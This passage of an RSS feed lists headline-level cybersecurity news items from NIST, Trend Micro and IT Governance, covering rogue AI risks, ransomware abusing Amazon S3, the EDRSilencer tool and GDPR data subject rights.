to</description><guid isPermaLink="false">https://www.nist.gov/node/1861666</guid></item><item><title>How to Mitigate the Impact of Rogue AI Risks</title><link>https://www.trendmicro.com/en_us/research/24/j/mitigate-rogue-ai-risks.html</link><description>This is the latest blog in an ongoing series on Rogue AI. Keep following for more technical guidance, case studies, and insights.</description><guid isPermaLink="false">urn:uuid:d1387812-8ed6-a7f4-ba17-6d867ccb4f92</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Cyber Crime</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Expert Perspective</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>Fake LockBit, Real Damage: Ransomware Samples Abuse Amazon S3 to Steal Data</title><link>https://www.trendmicro.com/en_us/research/24/j/fake-lockbit-real-damage-ransomware-samples-abuse-aws-s3-to-stea.html</link><description>This article uncovers a Golang ransomware abusing Amazon S3 for data theft, and masking as LockBit to further pressure victims. The discovery of hard-coded AWS credentials in these samples led to AWS account suspensions.</description><guid isPermaLink="false">urn:uuid:8949ce10-4ab1-cc55-923b-3464cd19ada3</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Staff Stories Spotlight Series: Cybersecurity Awareness Month 2024</title><link>https://www.nist.gov/blogs/cybersecurity-insights/staff-stories-spotlight-series-cybersecurity-awareness-month-2024-1</link><description>This blog is part of a larger NIST series during the month of October for Cybersecurity Awareness Month , called 'Staff Stories Spotlight.' Throughout the month of October this year, Q&amp;amp;A style blogs will be published featuring some of our unique staff members who have interesting backgrounds, stories to tell, and projects in the world of cybersecurity. This year’s Cybersecurity Awareness Month theme is ‘Secure our World.’ How does this theme resonate with you, as someone working in cybersecurity? Now more than ever, the use of technology is central to our lives. It is the means by which we are</description><guid isPermaLink="false">https://www.nist.gov/node/1861391</guid></item><item><title>Silent Threat: Red Team Tool EDRSilencer Disrupting Endpoint Security Solutions</title><link>https://www.trendmicro.com/en_us/research/24/j/edrsilencer-disrupting-endpoint-security-solutions.html</link><description>Trend Micro's Threat Hunting Team has observed EDRSilencer, a red team tool that threat actors are attempting to abuse for its ability to block EDR traffic and conceal malicious activity.</description><guid isPermaLink="false">urn:uuid:1be85902-d0e9-109f-09ba-a6ddef18598b</guid><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category><category>Trend Micro Research : Research</category></item><item><title>GDPR: Data Subject Rights and Organisations’ Responsibilities</title><link>https://www.itgovernance.co.uk/blog/what-are-the-data-subject-rights-under-the-gdpr</link><description>&lt;p&gt;The EU GDPR (General Data Protection Regulation) gives individuals eight rights relating to their personal data. Organisations must let individuals know how they can exercise these rights, and meet requests promptly. Failure to do so is a violation of the GDPR and could lead to disciplinary action. But first, what is a data subject?&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/what-are-the-data-subject-rights-under-the-gdpr"&gt;GDPR: Data Subject Rights and Organisations’ Responsibilities&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance UK Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Both the&amp;nbsp;UK and EU &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt;&amp;nbsp;grant data subjects certain rights over their data, which, if exercised, data controllers must facilitate.&lt;/p&gt;
 
 
